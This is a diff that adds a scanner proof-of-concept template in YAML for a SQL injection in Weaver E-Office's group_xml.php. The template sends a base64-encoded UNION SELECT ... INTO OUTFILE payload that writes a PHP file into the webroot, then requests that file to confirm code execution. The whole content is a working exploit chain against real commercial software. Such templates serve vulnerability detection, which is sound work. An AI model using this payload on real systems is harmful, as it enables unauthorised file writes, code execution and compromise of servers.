@@ -1,0 +1,20 @@
+id: poc-yaml-weaver-e-office-group-xml-php-sqli
+info:
+  name: 泛微 E-Office group_xml.php SQL注入漏洞
+  severity: critical
+  tags:
+  - sql-injection
+  finger: E-Office
+variables:
+  t1: random_str(8)
+  t2: base64(concat("[group]:[1]|[groupid]:[1 union select '<?php phpinfo()?>',2,3,4,5,6,7,8
+    into outfile '../webroot/",t1,".php']"))
+requests:
+- method: GET
+  path: /inc/group_user_list/group_xml.php?par={{.t2}}
+  expression: status_code == 200 && contains(body,"mysql_fetch_array()")
+- method: GET
+  path: /{{.t1}}.php
+  expression: status_code == 200 && contains(body,"PHP Version") && contains(body,"PHP
+    API")
+transport: http
